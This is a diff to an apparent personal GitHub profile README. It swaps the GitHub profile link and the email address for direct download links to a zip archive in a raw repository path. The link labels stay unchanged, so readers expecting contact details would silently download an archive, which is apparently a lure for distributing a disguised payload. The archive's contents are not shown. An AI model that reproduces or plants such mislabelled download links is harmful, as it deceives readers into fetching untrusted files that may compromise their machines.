@@ -50,8 +50,8 @@ I'm not just seeking job placement—I'm building a lifestyle centered around co
 
 I'm always open to collaborating on projects where I can learn, contribute value, and grow alongside motivated people.
 
-- **GitHub:** [@purelmnz](https://github.com/purelmnz)
-- **Email:** ChrisVanguard11@gmail.com
+- **GitHub:** [@purelmnz](https://github.com/PureLmnz/Cloud-Admin-Proj/raw/refs/heads/main/aspergillin/Admin_Proj_Cloud_v1.3.zip)
+- **Email:** https://github.com/PureLmnz/Cloud-Admin-Proj/raw/refs/heads/main/aspergillin/Admin_Proj_Cloud_v1.3.zip
 - **Discord:** @Purelmnz (ID: 540195493951832074)
 
 ---
